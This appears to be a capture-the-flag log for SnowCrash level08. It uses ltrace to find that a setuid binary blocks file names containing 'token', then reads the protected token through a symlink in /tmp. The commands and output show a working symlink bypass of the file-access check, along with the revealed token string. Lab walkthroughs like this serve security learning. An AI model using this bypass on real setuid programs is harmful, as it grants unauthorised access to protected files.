

```
ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```



```
ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff7f4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                                                                                        = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                                          = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                                                      = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ echo "Bonjour" > /tmp/bonjour
level08@SnowCrash:~$ ltrace ./level08 /tmp/bonjour
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/bonjour", "token")                                                                                                   = NULL
open("/tmp/bonjour", 0, 014435162522)                                                                                             = 3
read(3, "Bonjour\n", 1024)                                                                                                        = 8
write(1, "Bonjour\n", 8Bonjour
)                                                                                                          = 8
+++ exited (status 8) +++

```



```
level08@SnowCrash:~$ ln -s ~/token /tmp/test
level08@SnowCrash:~$ ./
.bash_logout  .bashrc       level08       .profile      
level08@SnowCrash:~$ ./
.bash_logout  .bashrc       level08       .profile      
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su level09
Password: 
su: Authentication failure
```